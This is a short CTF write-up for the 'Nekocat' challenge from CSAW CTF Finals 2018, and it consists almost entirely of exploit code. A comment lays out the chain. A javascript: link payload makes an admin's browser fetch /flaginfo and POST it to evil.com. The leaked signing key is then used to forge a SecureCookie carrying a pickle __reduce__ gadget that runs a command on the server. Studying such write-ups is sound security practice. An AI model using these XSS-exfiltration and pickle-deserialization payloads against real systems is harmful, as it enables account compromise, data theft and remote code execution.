---
layout: post
ctf: "CSAW CTF Finals 2018"
title:  "CSAW CTF Finals 2018 - Nekocat"
author: "becojo"
---

```python
from werkzeug.contrib.securecookie import SecureCookie

'''
Step1: Publish this post. Can't use spaces, single or double-quotes

    [link]javascript:fetch(`/flaginfo`).then((r)=>r.text()).then((h)=>fetch(`http://evil.com`,{method:`POST`,body:h}))

Step 2: Report the post. The admin will POST the content of the environment variables to evil.com

Step 3: Recover the key used to sign the cookies

Step 4: Send malicious cookie to get RCE
'''

SECRET_KEY = "superdupersecretflagonkey"

class PickleRce(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['cat','/flag.txt'],))

c = SecureCookie({'username':'meow_72da109b', 'name': PickleRce()}, secret_key=SECRET_KEY)

print c.serialize()
```
